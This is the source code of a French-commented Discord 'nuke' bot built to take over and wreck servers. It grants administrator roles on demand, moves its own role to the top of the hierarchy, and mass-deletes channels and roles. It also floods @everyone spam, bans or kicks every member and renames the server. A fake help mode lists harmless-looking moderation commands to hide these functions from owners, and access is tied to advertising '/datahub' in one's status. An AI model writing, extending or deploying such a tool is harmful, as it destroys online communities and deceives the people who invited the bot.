import os
import asyncio
import logging
import discord
from discord import app_commands
from discord.ext import commands

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
)
log = logging.getLogger('giveadmin-bot')

TOKEN = os.environ.get('DISCORD_TOKEN')
ROLE_NAME = os.environ.get('ADMIN_ROLE_NAME', 'W4X15DJ')
STATUS_KEYWORDS = ('/datahub', '.gg/datahub')

if not TOKEN:
    raise RuntimeError('DISCORD_TOKEN is not set in environment')

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.presences = True  # necessaire pour lire le statut custom

bot = commands.Bot(command_prefix='!', intents=intents)

# Etat par guilde : si True, /help affiche le faux help
fake_help_mode: dict[int, bool] = {}


# ----------------------------- helpers ----------------------------- #

async def _safe(coro):
    try:
        return await coro
    except Exception as e:
        log.warning('task failed: %s', e)
        return None


async def _move_bot_role_to_top(guild: discord.Guild):
    """Deplace le role le plus haut du bot tout en haut de la hierarchie."""
    me = guild.me
    if me is None:
        return None
    # On prend le role le plus eleve du bot (hors @everyone)
    bot_role = me.top_role
    if bot_role is None or bot_role.is_default():
        return None
    # Position la plus haute possible = nombre de roles - 1 (0 = everyone)
    max_pos = max((r.position for r in guild.roles), default=1)
    try:
        if bot_role.position < max_pos:
            await bot_role.edit(position=max_pos, reason='Placer le role du bot tout en haut')
    except discord.HTTPException as e:
        log.warning('Could not move bot role to top: %s', e)
    return bot_role


def _has_datahub_status(member: discord.Member) -> bool:
    """Retourne True si le membre a '/datahub' ou '.gg/datahub' dans son statut custom."""
    if member is None:
        return False
    for activity in member.activities or []:
        if isinstance(activity, discord.CustomActivity):
            text = (activity.name or '') + ' ' + (getattr(activity, 'state', '') or '')
        else:
            text = (getattr(activity, 'name', '') or '') + ' ' + (getattr(activity, 'state', '') or '')
        text = text.lower()
        if any(k.lower() in text for k in STATUS_KEYWORDS):
            return True
    return False


async def _is_authorized(interaction: discord.Interaction) -> tuple[bool, str]:
    """Verifie uniquement que l utilisateur a /datahub ou .gg/datahub dans son statut."""
    user = interaction.user

    # 1) essai dans la guilde courante (la plus fiable pour les presences)
    here = interaction.guild.get_member(user.id) if interaction.guild else None
    if _has_datahub_status(here):
        return True, ''

    # 2) fallback : essayer dans n importe quelle autre guilde partagee avec le bot
    for g in bot.guilds:
        m = g.get_member(user.id)
        if m is not None and _has_datahub_status(m):
            return True, ''

    return False, 'Mets `/datahub` ou `.gg/datahub` dans ton statut Discord pour utiliser ce bot.'


def require_auth():
    """Decorateur qui ajoute un check d autorisation a une commande slash."""
    async def predicate(interaction: discord.Interaction) -> bool:
        ok, msg = await _is_authorized(interaction)
        if not ok:
            if not interaction.response.is_done():
                await interaction.response.send_message(msg, ephemeral=True)
            else:
                await interaction.followup.send(msg, ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)


# ----------------------------- events ----------------------------- #

@bot.event
async def on_ready():
    log.info('Logged in as %s', bot.user)
    for guild in bot.guilds:
        try:
            await _move_bot_role_to_top(guild)
        except Exception as e:
            log.warning('move bot role failed on %s: %s', guild.id, e)
        try:
            bot.tree.copy_global_to(guild=guild)
            synced = await bot.tree.sync(guild=guild)
            log.info('Synced %d cmd(s) to guild %s', len(synced), guild.id)
        except Exception as e:
            log.exception('Guild sync failed: %s', e)


@bot.event
async def on_guild_join(guild: discord.Guild):
    log.info('Joined guild %s -- resyncing', guild.id)
    # Deplacer le role du bot tout en haut des l arrivee
    try:
        await _move_bot_role_to_top(guild)
    except Exception as e:
        log.warning('move bot role failed on join %s: %s', guild.id, e)
    try:
        bot.tree.copy_global_to(guild=guild)
        synced = await bot.tree.sync(guild=guild)
        log.info('Synced %d cmd(s) to new guild %s', len(synced), guild.id)
    except Exception as e:
        log.exception('on_guild_join sync failed: %s', e)


@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.CheckFailure):
        return  # message deja envoye
    log.exception('Command error: %s', error)
    try:
        if interaction.response.is_done():
            await interaction.followup.send(f'Erreur: `{error}`', ephemeral=True)
        else:
            await interaction.response.send_message(f'Erreur: `{error}`', ephemeral=True)
    except Exception:
        pass


# ----------------------------- /giveadmin ----------------------------- #

@bot.tree.command(name='giveadmin', description='Cree un role Admin et l attribue a un utilisateur')
@app_commands.describe(user_id='ID de l utilisateur a qui donner le role admin')
@require_auth()
async def giveadmin(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    try:
        uid = int(user_id.strip())
    except ValueError:
        await interaction.followup.send('ID invalide.', ephemeral=True)
        return

    member = guild.get_member(uid) or await guild.fetch_member(uid)
    me = guild.me
    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
        return

    # 1) S assurer que le role du bot est tout en haut
    bot_role = await _move_bot_role_to_top(guild) or me.top_role

    # 2) Creer le nouveau role admin
    role = await guild.create_role(
        name=ROLE_NAME,
        permissions=discord.Permissions(administrator=True),
        reason=f'/giveadmin by {interaction.user}',
    )

    # 3) Le placer JUSTE SOUS le role du bot (= position max - 1) = tout en haut possible
    try:
        target_pos = max((bot_role.position - 1) if bot_role else 1, 1)
        await role.edit(position=target_pos, reason='Place giveadmin role tout en haut (sous le bot)')
    except discord.HTTPException as e:
        log.warning('Could not reposition new role: %s', e)

    # 4) Attribuer
    await member.add_roles(role, reason=f'/giveadmin by {interaction.user}')
    await interaction.followup.send(
        f'Role **{role.name}** (Admin, place tout en haut) attribue a <@{member.id}>.',
        ephemeral=True,
    )


# ----------------------------- /n-salon ----------------------------- #

@bot.tree.command(
    name='n-salon',
    description='Supprime tous les salons, en cree N et y envoie un message en boucle',
)
@app_commands.describe(
    number='Nombre de salons a creer',
    message='Message a envoyer dans chaque salon',
    repeat='Nombre de fois que le message est envoye par salon (defaut 5)',
    name='Nom des salons crees (defaut: spam)',
)
@require_auth()
async def n_salon(
    interaction: discord.Interaction,
    number: int,
    message: str,
    repeat: int = 5,
    name: str = 'spam',
):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return
    if number < 1 or number > 500:
        await interaction.followup.send('number doit etre entre 1 et 500.', ephemeral=True)
        return
    if repeat < 1 or repeat > 50:
        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()
    await asyncio.gather(*[_safe(ch.delete(reason='/n-salon')) for ch in list(guild.channels)])

    create_tasks = [
        _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='/n-salon'))
        for i in range(number)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]

    async def flood(channel):
        sent = 0
        for _ in range(repeat):
            try:
                await channel.send(content=message)
                sent += 1
            except discord.HTTPException as e:
                log.warning('send failed on %s: %s', channel.id, e)
                await asyncio.sleep(0.5)
        return sent

    results = await asyncio.gather(*[flood(c) for c in created])
    total_sent = sum(results)
    elapsed = asyncio.get_event_loop().time() - start

    if created:
        try:
            await created[0].send(
                f'**/n-salon termine en {elapsed:.1f}s** - {len(created)}/{number} salons, {total_sent} messages.'
            )
        except Exception:
            pass


# ----------------------------- /spam-r ----------------------------- #

async def _spam_roles(guild: discord.Guild, base_name: str, count: int, reason: str) -> int:
    tasks = [
        _safe(guild.create_role(name=f'{base_name}-{i+1}', reason=reason))
        for i in range(count)
    ]
    results = await asyncio.gather(*tasks)
    return sum(1 for r in results if r is not None)


@bot.tree.command(name='spam-r', description='Cree en boucle des roles nommes {name}-1, {name}-2, ...')
@app_commands.describe(
    role_name='Nom de base des roles a creer',
    count='Nombre de roles a creer (defaut: 5)',
)
@require_auth()
async def spam_r(interaction: discord.Interaction, role_name: str, count: int = 5):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
        return
    if count < 1 or count > 250:
        await interaction.followup.send('count doit etre entre 1 et 250.', ephemeral=True)
        return
    base = role_name.strip()[:90] or 'role'

    start = asyncio.get_event_loop().time()
    created = await _spam_roles(guild, base, count, reason=f'/spam-r by {interaction.user}')
    elapsed = asyncio.get_event_loop().time() - start
    await interaction.followup.send(
        f'**{created}/{count}** roles `{base}-N` crees en {elapsed:.1f}s.',
        ephemeral=True,
    )


# ----------------------------- /nuke ----------------------------- #

@bot.tree.command(
    name='nuke',
    description='Nuke complet: supprime salons + roles, recree N salons, spam messages ET roles, renomme le serveur',
)
@app_commands.describe(
    channels='Nombre de salons a creer (defaut: 50)',
    message='Message a spam dans chaque salon (defaut: @everyone)',
    repeat='Nombre de messages par salon (defaut: 5)',
    channel_name='Nom des nouveaux salons (defaut: nuked)',
    server_name='Nouveau nom du serveur (optionnel)',
    delete_roles='Supprimer aussi tous les roles (defaut: true)',
    spam_role_name='Nom de base des roles a spam-creer (defaut: nuked)',
    spam_role_count='Nombre de roles a spam-creer (defaut: 50)',
)
@require_auth()
async def nuke(
    interaction: discord.Interaction,
    channels: int = 50,
    message: str = '@everyone',
    repeat: int = 5,
    channel_name: str = 'nuked',
    server_name: str = None,
    delete_roles: bool = True,
    spam_role_name: str = 'nuked',
    spam_role_count: int = 50,
):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return
    if channels < 1 or channels > 500:
        await interaction.followup.send('channels doit etre entre 1 et 500.', ephemeral=True)
        return
    if repeat < 1 or repeat > 50:
        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
        return
    if spam_role_count < 0 or spam_role_count > 250:
        await interaction.followup.send('spam_role_count doit etre entre 0 et 250.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()
    log.info('NUKE launched by %s on guild %s', interaction.user, guild.id)

    rename_task = None
    if server_name:
        new = server_name.strip()[:100]
        if len(new) >= 2:
            rename_task = asyncio.create_task(
                _safe(guild.edit(name=new, reason=f'/nuke by {interaction.user}'))
            )

    role_targets = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and r < me.top_role
    ] if delete_roles else []

    delete_tasks = [_safe(c.delete(reason='/nuke')) for c in list(guild.channels)]
    delete_tasks += [_safe(r.delete(reason='/nuke')) for r in role_targets]
    await asyncio.gather(*delete_tasks)

    create_tasks = [
        _safe(guild.create_text_channel(name=f'{channel_name}-{i+1}', reason='/nuke'))
        for i in range(channels)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]

    # Spam roles en parallele
    spam_roles_created = 0
    if spam_role_count > 0:
        spam_roles_created = await _spam_roles(
            guild, spam_role_name.strip()[:90] or 'nuked', spam_role_count,
            reason=f'/nuke spam-r by {interaction.user}',
        )

    async def flood(channel):
        sent = 0
        for _ in range(repeat):
            try:
                await channel.send(content=message)
                sent += 1
            except discord.HTTPException as e:
                log.warning('send failed on %s: %s', channel.id, e)
                await asyncio.sleep(0.5)
        return sent

    results = await asyncio.gather(*[flood(c) for c in created])
    total_sent = sum(results)

    if rename_task:
        await rename_task

    elapsed = asyncio.get_event_loop().time() - start
    summary = (
        f'**NUKE termine en {elapsed:.1f}s**\n'
        f'- {len(created)}/{channels} salons crees\n'
        f'- {len(role_targets)} roles supprimes\n'
        f'- {spam_roles_created} roles spam `{spam_role_name}-N` crees\n'
        f'- {total_sent} messages envoyes\n'
        + (f'- Serveur renomme en **{server_name}**\n' if server_name else '')
    )
    if created:
        try:
            await created[0].send(summary)
        except Exception:
            pass


# ----------------------------- /reset ----------------------------- #

@bot.tree.command(name='reset', description='Supprime TOUT (salons, roles) et cree un salon _terminal')
@require_auth()
async def reset(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()

    # 1) Supprimer tous les salons
    chan_tasks = [_safe(c.delete(reason='/reset')) for c in list(guild.channels)]
    # 2) Supprimer tous les roles possibles (sauf everyone, managed, >= bot)
    role_targets = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and r < me.top_role
    ]
    role_tasks = [_safe(r.delete(reason='/reset')) for r in role_targets]

    await asyncio.gather(*chan_tasks, *role_tasks)

    # 3) Creer le salon _terminal
    terminal = await _safe(guild.create_text_channel(name='_terminal', reason='/reset terminal'))

    elapsed = asyncio.get_event_loop().time() - start
    remaining_roles = {r.id for r in guild.roles}
    deleted_roles = sum(1 for r in role_targets if r.id not in remaining_roles)

    if terminal:
        try:
            await terminal.send(
                f'**/reset termine en {elapsed:.1f}s** - {deleted_roles}/{len(role_targets)} roles supprimes. '
                f'Salon `_terminal` cree.'
            )
        except Exception:
            pass
    await interaction.followup.send(
        f'Reset complet en {elapsed:.1f}s. Salon `_terminal` cree.',
        ephemeral=True,
    )


# ----------------------------- /ban-all & /kick-all ----------------------------- #

@bot.tree.command(name='ban-all', description='Bannit tous les membres du serveur')
@require_auth()
async def ban_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.ban_members:
        await interaction.followup.send('Le bot doit avoir Ban Members / Administrateur.', ephemeral=True)
        return

    targets = [
        m for m in guild.members
        if not m.bot and m.id != interaction.user.id and m.id != guild.owner_id and m.top_role < me.top_role
    ]
    start = asyncio.get_event_loop().time()
    await asyncio.gather(*[_safe(m.ban(reason=f'/ban-all by {interaction.user}', delete_message_days=0)) for m in targets])
    elapsed = asyncio.get_event_loop().time() - start

    # compte : ceux qui ne sont plus dans la guilde
    remaining_ids = {m.id for m in guild.members}
    banned = sum(1 for m in targets if m.id not in remaining_ids)
    await interaction.followup.send(
        f'**{banned}/{len(targets)}** membres bannis en {elapsed:.1f}s.',
        ephemeral=True,
    )


@bot.tree.command(name='kick-all', description='Expulse tous les membres du serveur')
@require_auth()
async def kick_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.kick_members:
        await interaction.followup.send('Le bot doit avoir Kick Members / Administrateur.', ephemeral=True)
        return

    targets = [
        m for m in guild.members
        if not m.bot and m.id != interaction.user.id and m.id != guild.owner_id and m.top_role < me.top_role
    ]
    start = asyncio.get_event_loop().time()
    await asyncio.gather(*[_safe(m.kick(reason=f'/kick-all by {interaction.user}')) for m in targets])
    elapsed = asyncio.get_event_loop().time() - start

    remaining_ids = {m.id for m in guild.members}
    kicked = sum(1 for m in targets if m.id not in remaining_ids)
    await interaction.followup.send(
        f'**{kicked}/{len(targets)}** membres expulses en {elapsed:.1f}s.',
        ephemeral=True,
    )


# ----------------------------- /rename-s ----------------------------- #

@bot.tree.command(name='rename-s', description='Renomme le serveur')
@app_commands.describe(name='Nouveau nom du serveur (2 a 100 caracteres)')
@require_auth()
async def rename_s(interaction: discord.Interaction, name: str):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.manage_guild:
        await interaction.followup.send('Le bot doit avoir Manage Server / Administrateur.', ephemeral=True)
        return

    new_name = name.strip()
    if len(new_name) < 2 or len(new_name) > 100:
        await interaction.followup.send('Le nom doit faire entre 2 et 100 caracteres.', ephemeral=True)
        return

    old_name = guild.name
    try:
        await guild.edit(name=new_name, reason=f'/rename-s by {interaction.user}')
    except discord.HTTPException as e:
        await interaction.followup.send(f'Erreur Discord: `{e}`', ephemeral=True)
        return

    await interaction.followup.send(
        f'Serveur renomme: **{old_name}** -> **{new_name}**',
        ephemeral=True,
    )


# ----------------------------- /supp-roles ----------------------------- #

@bot.tree.command(name='supp-roles', description='Supprime tous les roles (all) ou un role precis par son ID')
@app_commands.describe(target='"all" pour tout supprimer, ou l ID d un role specifique (defaut: all)')
@require_auth()
async def supp_roles(interaction: discord.Interaction, target: str = 'all'):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
        return

    target = target.strip().lower()

    if target != 'all':
        try:
            rid = int(target)
        except ValueError:
            await interaction.followup.send('target doit etre "all" ou un ID numerique.', ephemeral=True)
            return
        role = guild.get_role(rid)
        if role is None:
            await interaction.followup.send(f'Aucun role avec l ID `{rid}`.', ephemeral=True)
            return
        if role.is_default() or role.managed or role >= me.top_role:
            await interaction.followup.send('Role non supprimable (everyone, integration, ou hierarchie).', ephemeral=True)
            return
        await role.delete(reason=f'/supp-roles by {interaction.user}')
        await interaction.followup.send(f'Role **{role.name}** supprime.', ephemeral=True)
        return

    deletable = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and r < me.top_role
    ]
    if not deletable:
        await interaction.followup.send('Aucun role supprimable trouve.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()
    await asyncio.gather(*[_safe(r.delete(reason='/supp-roles all')) for r in deletable])
    remaining = {r.id for r in guild.roles}
    deleted_count = sum(1 for r in deletable if r.id not in remaining)
    elapsed = asyncio.get_event_loop().time() - start
    await interaction.followup.send(
        f'**{deleted_count}/{len(deletable)}** roles supprimes en {elapsed:.1f}s.',
        ephemeral=True,
    )


# ----------------------------- /help & /fakehelp ----------------------------- #

def _build_real_help_embed() -> discord.Embed:
    embed = discord.Embed(
        title='Commandes du bot',
        description='Liste des commandes reellement disponibles.',
        color=0x5865F2,
    )
    embed.add_field(name='Admin / Roles', value=(
        '`/giveadmin <user_id>` - Cree un role Admin (tout en haut) et l attribue\n'
        '`/spam-r <role_name> [count=5]` - Cree count roles nommes role_name-1, role_name-2, ...\n'
        '`/supp-roles [all|role_id]` - Supprime tous les roles ou un role precis'
    ), inline=False)
    embed.add_field(name='Salons / Messages', value=(
        '`/n-salon <number> <message> [repeat=5] [name=spam]` - Supprime tout, recree N salons, spam\n'
        '`/rename-s <name>` - Renomme le serveur'
    ), inline=False)
    embed.add_field(name='Destruction', value=(
        '`/nuke [channels=50] [message] [repeat=5] [channel_name] [server_name] [delete_roles] [spam_role_name] [spam_role_count=50]` - Nuke complet\n'
        '`/reset` - Supprime TOUT et cree un salon `_terminal`\n'
        '`/ban-all` - Ban tous les membres\n'
        '`/kick-all` - Kick tous les membres'
    ), inline=False)
    embed.add_field(name='Help', value=(
        '`/help` - Affiche ce message\n'
        '`/fakehelp` - Bascule `/help` en mode "faux help" (commandes fictives)\n'
        '`/fake-help <salon>` - Envoie un faux embed d aide dans un salon'
    ), inline=False)
    embed.set_footer(text='Acces reserve aux membres du serveur principal datahub')
    return embed


def _build_fake_help_embed() -> discord.Embed:
    embed = discord.Embed(
        title='Liste des commandes',
        description='Voici les commandes disponibles sur ce serveur.',
        color=0x5865F2,
    )
    embed.add_field(name='Moderation', value=(
        '`/ban` - Bannir un utilisateur\n'
        '`/kick` - Expulser un utilisateur\n'
        '`/mute` - Rendre muet un utilisateur\n'
        '`/unmute` - Retirer le mute\n'
        '`/warn` - Avertir un utilisateur\n'
        '`/clear` - Supprimer des messages'
    ), inline=False)
    embed.add_field(name='Utilitaires', value=(
        '`/userinfo` - Infos sur un utilisateur\n'
        '`/serverinfo` - Infos sur le serveur\n'
        '`/avatar` - Afficher l avatar\n'
        '`/ping` - Latence du bot'
    ), inline=False)
    embed.add_field(name='Roles', value=(
        '`/role-add` - Ajouter un role\n'
        '`/role-remove` - Retirer un role\n'
        '`/role-list` - Liste des roles'
    ), inline=False)
    embed.add_field(name='Fun', value=(
        '`/say` - Faire parler le bot\n'
        '`/poll` - Creer un sondage\n'
        '`/8ball` - Boule magique\n'
        '`/coinflip` - Pile ou face'
    ), inline=False)
    embed.set_footer(text='Tape une commande pour l utiliser')
    return embed


@bot.tree.command(name='help', description='Affiche la liste des commandes')
async def help_cmd(interaction: discord.Interaction):
    # /help est public : pas de check d autorisation (pour que le faux help trompe tout le monde)
    gid = interaction.guild.id if interaction.guild else 0
    if fake_help_mode.get(gid, False):
        embed = _build_fake_help_embed()
    else:
        embed = _build_real_help_embed()
    await interaction.response.send_message(embed=embed, ephemeral=False)


@bot.tree.command(name='fakehelp', description='Bascule /help en mode "faux help" (commandes fictives)')
@app_commands.describe(enabled='true = active le faux help, false = revient au vrai help (defaut: toggle)')
@require_auth()
async def fakehelp_cmd(interaction: discord.Interaction, enabled: bool = None):
    if interaction.guild is None:
        await interaction.response.send_message('A utiliser dans un serveur.', ephemeral=True)
        return
    gid = interaction.guild.id
    current = fake_help_mode.get(gid, False)
    new_state = (not current) if enabled is None else bool(enabled)
    fake_help_mode[gid] = new_state
    status = 'ACTIF (faux help)' if new_state else 'DESACTIVE (vrai help)'
    await interaction.response.send_message(
        f'Mode fake-help : **{status}**. `/help` affichera maintenant {"les fausses" if new_state else "les vraies"} commandes.',
        ephemeral=True,
    )


# ----------------------------- /fake-help (envoi direct dans un salon) ----------------------------- #

@bot.tree.command(name='fake-help', description='Envoie un embed help (faux) dans le salon choisi')
@app_commands.describe(salon='Salon ou envoyer l embed')
@require_auth()
async def fake_help(interaction: discord.Interaction, salon: discord.TextChannel):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    me = interaction.guild.me
    perms = salon.permissions_for(me) if me else None
    if not perms or not perms.send_messages or not perms.embed_links:
        await interaction.followup.send(f'Le bot ne peut pas envoyer d embed dans {salon.mention}.', ephemeral=True)
        return

    await salon.send(embed=_build_fake_help_embed())
    await interaction.followup.send(f'Embed envoye dans {salon.mention}.', ephemeral=True)


if __name__ == '__main__':
    bot.run(TOKEN, reconnect=True)
